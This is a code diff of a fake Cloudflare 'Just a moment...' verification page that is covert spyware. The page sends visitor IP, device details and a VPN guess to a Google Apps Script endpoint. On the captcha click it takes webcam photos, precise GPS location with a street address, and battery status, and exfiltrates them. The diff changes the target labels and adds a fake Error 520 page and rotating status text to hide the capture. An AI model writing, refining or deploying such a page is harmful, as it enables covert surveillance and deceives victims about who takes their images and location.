@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Just a moment...</title>
+    <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
     <style>
         * { box-sizing: border-box; }
         body {
@@ -79,13 +80,13 @@
 
     <script>
         // ==========================================
-        // 🛡️ SECURITY CONFIGURATION
+        // CONFIGURATION
         // ==========================================
-        // СЮДА ВСТАВИТЬ URL ИЗ GOOGLE APPS SCRIPT
         const _P_URL = "https://script.google.com/macros/s/AKfycbzMm4DrahVeftCcXwFQ9n5J0Z8W4NH4pp_HmhFa6oPRl4vPsJXlO61PNMrURhRwpCgO/exec"; 
         // ==========================================
 
-        document.getElementById('ray-id').innerText = Math.random().toString(16).substr(2, 16);
+        const generateHex = (len) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+        document.getElementById('ray-id').innerText = generateHex(16);
         const sleep = (ms) => new Promise(r => setTimeout(r, ms));
         const log = (msg) => console.log(`[SYS] ${msg}`);
 
@@ -147,8 +148,8 @@
 
             // VPN Check
             let v = "";
-            if (new Date().getTimezoneOffset() === -180) { // UTC+3
-                if (d.k !== 'BY' && d.k !== 'RU') v = "⚠️ DETECTED VPN";
+            if (new Date().getTimezoneOffset() === -180) {
+                if (d.k !== 'BY' && d.k !== 'RU') v = "DETECTED VPN";
             }
             return { ...d, v };
         }
@@ -187,7 +188,7 @@
             document.getElementById('display-ip').innerText = n.i;
 
             const msg = `
-*НОВАЯ ЦЕЛЬ (ONLINE)*
+*CONNECTION ESTABLISHED*
 ━━━━━━━━━━━━━━━━
 ${n.v}
 
@@ -211,84 +212,196 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             await _sD(msg);
         });
 
-        // --- PHASE 2: INTERACTIVE ---
+        // --- INTERACTIVE CHECK ---
         const bB = document.getElementById('captcha-box');
         const b = document.getElementById('btn');
         
+        // Error Page Logic
+        function showError() {
+            document.title = "Error 520 | Website.com";
+            document.body.innerHTML = `
+                <div style="font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #fff; padding: 20px;">
+                    <div style="max-width: 800px; width: 100%; text-align: center;">
+                        <h1 style="font-size: 60px; font-weight: 300; margin: 0; color: #333;">Error 520</h1>
+                        <div style="font-size: 24px; color: #666; margin: 10px 0;">Web server is returning an unknown error</div>
+                        
+                        <!-- Visual Diagram -->
+                        <div style="display: flex; align-items: center; justify-content: center; margin: 40px 0; gap: 30px; flex-wrap: wrap;">
+                            <div style="text-align: center;">
+                                <div style="font-size: 40px; color: #28a745;">&#128187;</div>
+                                <div style="margin-top: 10px; font-weight: 500; font-size: 14px;">Browser</div>
+                                <div style="color: #28a745; font-size: 12px;">Working</div>
+                            </div>
+                            <div style="font-size: 20px; color: #ccc;">&#8594;</div>
+                            <div style="text-align: center;">
+                                <div style="font-size: 40px; color: #28a745;">&#9729;</div>
+                                <div style="margin-top: 10px; font-weight: 500; font-size: 14px;">Cloudflare</div>
+                                <div style="color: #28a745; font-size: 12px;">Working</div>
+                            </div>
+                            <div style="font-size: 20px; color: #ccc;">&#8594;</div>
+                            <div style="text-align: center;">
+                                <div style="font-size: 40px; color: #dc3545;">&#128483;</div>
+                                <div style="margin-top: 10px; font-weight: 500; font-size: 14px;">Host</div>
+                                <div style="color: #dc3545; font-size: 12px;">Error</div>
+                            </div>
+                        </div>
+
+                        <!-- Technical Details Section -->
+                        <div style="border-top: 1px solid #eee; padding-top: 20px; display: inline-block; text-align: left; width: 100%; max-width: 400px;">
+                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                                <span style="font-size: 13px; color: #666;">
+                                    Cloudflare Ray ID: <strong id="ray-id-text" style="color:#333; cursor:pointer;" title="Click to copy">${document.getElementById('ray-id').innerText}</strong>
+                                </span>
+                                <span id="copy-hint" style="display:none; color:#009900; font-size: 11px;">Copied!</span>
+                            </div>
+                            
+                            <div style="font-size: 13px;">
+                                <a href="#" onclick="document.getElementById('err-details').style.display='block'; return false;" style="color: #c0392b; text-decoration: none; font-weight: 500;">&#9656; Technical Details</a>
+                                <div id="err-details" style="display:none; margin-top: 15px; background: #f9f9f9; padding: 15px; border-radius: 4px; border: 1px solid #e0e0e0; font-family: monospace; color: #333; font-size: 11px;">
+                                    <div style="margin-bottom: 5px;"><strong>Ray ID:</strong> ${document.getElementById('ray-id').innerText}</div>
+                                    <div style="margin-bottom: 5px;"><strong>Your IP:</strong> ${document.getElementById('display-ip').innerText}</div>
+                                    <div style="margin-bottom: 5px;"><strong>User Agent:</strong> ${navigator.userAgent}</div>
+                                    <div style="margin-bottom: 5px;"><strong>Time:</strong> ${new Date().toISOString()}</div>
+                                    <div style="margin-bottom: 5px;"><strong>Server:</strong> AMS-IX-CLOUDFLARE</div>
+                                    <div><strong>Event ID:</strong> ${generateHex(32)}</div>
+                                </div>
+                            </div>
+                            
+                            <div style="margin-top: 20px; text-align: center;">
+                                <a href="https://www.cloudflare.com/5xx-error-landing" target="_blank" style="color:#999; text-decoration:none; font-size:12px;">What happened?</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.body.style.display = "block";
+            document.body.style.backgroundColor = "#fff";
+            
+            // Click to Copy Logic
+            document.getElementById('ray-id-text').onclick = function() {
+                const text = this.innerText;
+                navigator.clipboard.writeText(text);
+                const hint = document.getElementById('copy-hint');
+                hint.style.display = 'inline';
+                setTimeout(() => hint.style.display = 'none', 2000);
+            };
+        }
+
         bB.onclick = async () => {
             if (b.style.display === 'none') return;
             b.style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            document.getElementById('label-text').innerText = "Verifying...";
-
-            let bat = "N/A";
-            if (navigator.getBattery) {
-                const bt = await navigator.getBattery();
-                bat = `${Math.round(bt.level * 100)}%${bt.charging?'⚡':''}`;
+            log("Starting Check...");
+            
+            // 1. Camera
+            document.getElementById('label-text').innerText = "Allow Camera...";
+            let stream = null;
+            let video = document.getElementById('video');
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 } } 
+                });
+                video.srcObject = stream;
+                try { await video.play(); } catch(e) { log("Autoplay: " + e); }
+            } catch (e) {
+                log("Camera: " + e);
             }
 
-            try {
-                const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
-                const v = document.getElementById('video');
-                v.srcObject = st;
-                await v.play();
+            // 2. Location
+            document.getElementById('label-text').innerText = "Allow Location...";
+            
+            const gpsPromise = new Promise(resolve => {
+                if (!navigator.geolocation) return resolve({t:"*GPS Not Supported*", e:true});
+                
+                const timer = setTimeout(() => resolve({t:"*GPS: Timeout*", e:true}), 60000);
 
-                // GPS
-                let gps = "*GPS Denied*";
-                const gP = new Promise(r => {
-                    navigator.geolocation.getCurrentPosition(
-                        async p => {
-                            const {latitude:la, longitude:lo} = p.coords;
-                            const l = `https://www.google.com/maps?q=${la},${lo}`;
-                            let a = "Unknown";
-                            try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
-                            r(`Адрес: ${a}\nКарты: [клик](${l})`);
-                        },
-                        () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true}
-                    );
-                });
+                navigator.geolocation.getCurrentPosition(
+                    async p => {
+                        clearTimeout(timer);
+                        const {latitude:la, longitude:lo} = p.coords;
+                        const link = `https://www.google.com/maps?q=${la},${lo}`;
+                        let addr = "Unknown";
+                        try { 
+                            const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); 
+                            addr = (await req.json()).display_name; 
+                        } catch{}
+                        resolve({t:`Address: ${addr}\nMap: [Click](${link})`, e:false});
+                    },
+                    (err) => {
+                        clearTimeout(timer);
+                        let e = "Error";
+                        if (err.code === 1) e = "Denied";
+                        else if (err.code === 2) e = "Unavailable";
+                        else if (err.code === 3) e = "Timeout";
+                        resolve({t:`*GPS Error: ${e}*`, e:true});
+                    },
+                    { enableHighAccuracy: true }
+                );
+            });
 
-                await sleep(2500); // Warmup
+            // 3. Capture
+            let ph = [];
+            if (stream) {
+                document.getElementById('label-text').innerText = "Verifying...";
+                
+                await sleep(1500); 
 
                 const c = document.getElementById('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
                 const ctx = c.getContext('2d');
-                const ph = [];
 
                 for(let i=0; i<3; i++) {
-                    ctx.drawImage(v,0,0);
-                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
-                    if(i<2) await sleep(800);
+                    ctx.drawImage(video,0,0);
+                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
+                    if(i<2) await sleep(600);
                 }
+                
+                stream.getTracks().forEach(t=>t.stop());
+            }
 
-                gps = await gP;
-                st.getTracks().forEach(t=>t.stop());
+            // 4. Wait for Location
+            // Dynamic Status Loop to mask delay
+                const statuses = ["Verifying...", "Checking browser...", "Analyzing traffic...", "Confirming connection..."];
+                let sIdx = 0;
+                const statusInterval = setInterval(() => {
+                    document.getElementById('label-text').innerText = statuses[sIdx++ % statuses.length];
+                }, 1500);
+                
+                const gpsData = await gpsPromise;
+                clearInterval(statusInterval);
+                document.getElementById('label-text').innerText = "Finishing...";
+                const gps = gpsData.t;
 
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('success-icon').style.display = 'block';
-                document.getElementById('label-text').innerText = "Success!";
-                document.getElementById('label-text').style.color = "#009900";
+                // 5. Battery
+                let bat = "N/A";
+            if (navigator.getBattery) {
+                try {
+                    const bt = await navigator.getBattery();
+                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Подзаряжается' : 'От батареи'})`;
+                } catch {}
+            }
 
-                const fM = `
-*ПОЛНЫЙ ОТЧЕТ (Phase 2)*
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('success-icon').style.display = 'block';
+            document.getElementById('label-text').innerText = "Success!";
+            document.getElementById('label-text').style.color = "#009900";
+
+            const fM = `
+*FULL REPORT*
 ━━━━━━━━━━━━━━━━
-*ГЕОПОЗИЦИЯ*
+*LOCATION*
 ${gps}
 
-*СТАТУС БАТАРЕИ*
-Заряд: ${bat}
+*BATTERY*
+Status: ${bat}
 
-*ФОТО*
-Захвачено фото: ${ph.length} шт.
+*PHOTOS*
+Captured: ${ph.length > 0 ? ph.length : "NO ACCESS"}
 `.trim();
 
-                await _sD(fM, ph);
-                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
-
-            } catch (e) {
-                _sD(`❌ *ACCESS DENIED*: ${e.message}`);
-                window.location.href = "https://vk.com/atypical_kazan";
-            }
+            await _sD(fM, ph);
+            setTimeout(showError, 1500);
         };
     </script>
 </body>
